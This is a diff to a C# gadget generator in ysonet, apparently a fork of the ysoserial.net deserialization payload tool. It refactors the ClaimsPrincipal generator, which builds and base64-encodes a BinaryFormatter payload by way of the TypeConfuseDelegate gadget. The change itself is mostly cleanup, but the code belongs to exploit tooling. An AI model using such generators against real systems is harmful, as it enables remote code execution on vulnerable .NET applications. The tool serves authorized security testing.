@@ -1,11 +1,7 @@
 ﻿using System;
-using System.Collections;
 using System.Collections.Generic;
-using System.ComponentModel.Design;
-using ysonet.Helpers;
 using System.IO;
-using System.Reflection;
-using System.Web.UI.WebControls;
+using ysonet.Helpers;
 using ysonet.Helpers.ModifiedVulnerableBinaryFormatters;
 
 namespace ysonet.Generators
@@ -18,11 +14,6 @@ namespace ysonet.Generators
             return new List<string> { "BinaryFormatter", "SoapFormatter", "LosFormatter" };
         }
 
-        public override string Name()
-        {
-            return "ClaimsPrincipal";
-        }
-
         public override string Finders()
         {
             return "jang";
@@ -30,7 +21,7 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.BridgeAndDerived, "OnDeserialized" , "SecondOrderDeserialization"};
+            return new List<string> { GadgetTags.Bridged, GadgetTags.OnDeserialized, GadgetTags.SecondOrderDeserialization };
         }
 
         public override string SupportedBridgedFormatter()
@@ -43,11 +34,11 @@ namespace ysonet.Generators
             byte[] binaryFormatterPayload;
             if (BridgedPayload != null)
             {
-                binaryFormatterPayload = (byte[]) BridgedPayload;
+                binaryFormatterPayload = (byte[])BridgedPayload;
             }
             else
             {
-                binaryFormatterPayload = (byte[]) (new TypeConfuseDelegateGenerator()).GenerateWithNoTest("BinaryFormatter", inputArgs);
+                binaryFormatterPayload = (byte[])(new TypeConfuseDelegateGenerator()).GenerateWithNoTest("BinaryFormatter", inputArgs);
             }
 
             string b64encoded = Convert.ToBase64String(binaryFormatterPayload);
